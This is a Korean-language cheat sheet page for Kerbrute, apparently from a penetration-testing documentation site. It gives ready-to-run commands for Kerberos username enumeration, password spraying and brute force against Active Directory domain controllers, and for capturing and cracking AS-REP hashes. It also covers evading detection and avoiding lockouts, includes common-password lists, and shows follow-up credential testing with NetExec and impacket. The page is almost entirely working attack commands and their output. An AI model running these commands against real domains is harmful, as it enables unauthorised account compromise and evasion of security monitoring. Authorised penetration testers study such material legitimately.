---
sidebar_position: 4
---

# Kerbrute

Kerberos 프로토콜을 이용한 사용자 열거 및 비밀번호 스프레이 도구입니다.

## 설치

```bash
# Go로 설치
go install github.com/ropnop/kerbrute@latest

# 바이너리 다운로드
wget https://github.com/ropnop/kerbrute/releases/download/v1.0.3/kerbrute_linux_amd64
chmod +x kerbrute_linux_amd64
mv kerbrute_linux_amd64 /usr/local/bin/kerbrute
```

## 기본 사용법

```bash
kerbrute <COMMAND> [OPTIONS]
```

## 사용자 열거 (User Enumeration)

### 기본 사용

```bash
# 도메인과 DC 지정
kerbrute userenum -d <DOMAIN> --dc <DC_IP> userlist.txt

# 실제 예제
kerbrute userenum -d corp.local --dc 10.10.10.100 /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt
```

### 옵션

```bash
# 출력 파일 지정
kerbrute userenum -d <DOMAIN> --dc <DC_IP> -o valid_users.txt userlist.txt

# Verbose 모드
kerbrute userenum -d <DOMAIN> --dc <DC_IP> -v userlist.txt

# 스레드 수 조절
kerbrute userenum -d <DOMAIN> --dc <DC_IP> -t 10 userlist.txt

# 안전 모드 (느리지만 탐지 회피)
kerbrute userenum -d <DOMAIN> --dc <DC_IP> --safe userlist.txt
```

## 비밀번호 스프레이 (Password Spray)

### 기본 사용

```bash
# 단일 비밀번호로 여러 사용자 테스트
kerbrute passwordspray -d <DOMAIN> --dc <DC_IP> users.txt <PASSWORD>

# 실제 예제
kerbrute passwordspray -d corp.local --dc 10.10.10.100 valid_users.txt Password123
```

### 옵션

```bash
# 출력 파일 지정
kerbrute passwordspray -d <DOMAIN> --dc <DC_IP> -o results.txt users.txt <PASSWORD>

# Verbose 모드
kerbrute passwordspray -d <DOMAIN> --dc <DC_IP> -v users.txt <PASSWORD>

# 스레드 수 조절
kerbrute passwordspray -d <DOMAIN> --dc <DC_IP> -t 5 users.txt <PASSWORD>
```

### 여러 비밀번호 테스트

```bash
# 비밀번호 리스트로 스프레이
for pass in $(cat passwords.txt); do
    echo "Trying password: $pass"
    kerbrute passwordspray -d <DOMAIN> --dc <DC_IP> users.txt "$pass"
    sleep 30m  # 30분 대기 (계정 잠금 방지)
done
```

## 브루트포스 (Brute Force)

```bash
# 사용자:비밀번호 조합
kerbrute bruteuser -d <DOMAIN> --dc <DC_IP> passwords.txt <USERNAME>

# 여러 사용자에 대해
kerbrute bruteforce -d <DOMAIN> --dc <DC_IP> combo.txt
```

## 실제 시나리오

### 1단계: 사용자 열거

```bash
# 일반적인 사용자명 리스트로 시작
kerbrute userenum -d corp.local --dc 10.10.10.100 --safe -o valid_users.txt /usr/share/seclists/Usernames/Names/names.txt
```

### 2단계: 비밀번호 스프레이

```bash
# 발견된 사용자에 대해 일반적인 비밀번호 시도
kerbrute passwordspray -d corp.local --dc 10.10.10.100 valid_users.txt Welcome1
kerbrute passwordspray -d corp.local --dc 10.10.10.100 valid_users.txt Password123
kerbrute passwordspray -d corp.local --dc 10.10.10.100 valid_users.txt Summer2024
```

### 3단계: 발견된 자격증명 확인

```bash
# NetExec으로 확인
netexec smb 10.10.10.100 -u found_user -p found_pass
```

## 옵션 설명

```bash
-d, --domain <DOMAIN>        # 타겟 도메인
--dc <DC_IP>                 # Domain Controller IP
-o, --output <FILE>          # 결과 출력 파일
-t, --threads <N>            # 스레드 수 (기본 10)
-v, --verbose                # Verbose 출력
--safe                       # 안전 모드 (느림)
--downgrade                  # RC4 암호화 사용
--hash-file <FILE>           # AS-REP 해시 저장
```

## 유용한 사용자명 리스트

```bash
# SecLists
/usr/share/seclists/Usernames/Names/names.txt
/usr/share/seclists/Usernames/xato-net-10-million-usernames.txt
/usr/share/seclists/Usernames/cirt-default-usernames.txt

# 일반적인 사용자명
administrator
admin
user
guest
service
root
```

## 일반적인 비밀번호 패턴

```bash
# 계절 + 년도
Spring2024
Summer2024
Fall2024
Winter2024

# 회사명 + 년도
CompanyName2024

# 일반적인 패턴
Password1
Password123
Welcome1
Welcome123
Passw0rd!
P@ssw0rd
```

## AS-REP Roasting과 함께 사용

```bash
# AS-REP Roastable 계정 찾기
kerbrute userenum -d <DOMAIN> --dc <DC_IP> --hash-file asrep.hash userlist.txt

# 발견된 해시 크랙
hashcat -m 18200 asrep.hash /usr/share/wordlists/rockyou.txt
```

## 탐지 회피

### 느린 스프레이

```bash
# 스레드 수 줄이기
kerbrute passwordspray -d <DOMAIN> --dc <DC_IP> -t 1 users.txt <PASSWORD>

# 안전 모드
kerbrute passwordspray -d <DOMAIN> --dc <DC_IP> --safe users.txt <PASSWORD>
```

### 계정 잠금 방지

```bash
# 비밀번호 간 충분한 대기 시간
kerbrute passwordspray -d <DOMAIN> --dc <DC_IP> users.txt Password1
sleep 1h
kerbrute passwordspray -d <DOMAIN> --dc <DC_IP> users.txt Password2
```

## 도메인 정보 없이 사용

```bash
# IP만으로 (도메인은 자동 감지 시도)
kerbrute userenum --dc 10.10.10.100 userlist.txt
```

## 결과 해석

### 성공적인 사용자 열거

```
2024/01/01 10:00:00 >  [+] VALID USERNAME:       administrator@corp.local
2024/01/01 10:00:01 >  [+] VALID USERNAME:       john.doe@corp.local
```

### 성공적인 비밀번호 스프레이

```
2024/01/01 10:00:00 >  [+] VALID LOGIN:  john.doe@corp.local:Password123
```

### 잠긴 계정

```
2024/01/01 10:00:00 >  [!] LOCKED:       admin@corp.local
```

## 다른 도구와 조합

### impacket GetNPUsers.py

```bash
# Kerbrute로 사용자 발견 후
impacket-GetNPUsers -dc-ip 10.10.10.100 corp.local/ -usersfile valid_users.txt -format hashcat
```

### CrackMapExec / NetExec

```bash
# 발견된 자격증명 테스트
netexec smb 10.10.10.100 -u valid_users.txt -p found_passwords.txt
```

## 참고

- Kerberos Pre-Authentication을 이용하여 사용자 열거
- 도메인 로그에 실패한 로그인 기록이 남지 않음 (Pre-Auth 단계)
- 비밀번호 스프레이는 계정 잠금 정책 주의
- `--safe` 모드는 탐지 회피에 도움
- 일반적으로 3-5회 시도 후 충분한 대기 시간 필요
- AS-REP Roastable 계정 발견에도 유용
- 익명 바인드가 비활성화된 환경에서도 작동
- Kerberos는 UDP 88 포트 사용
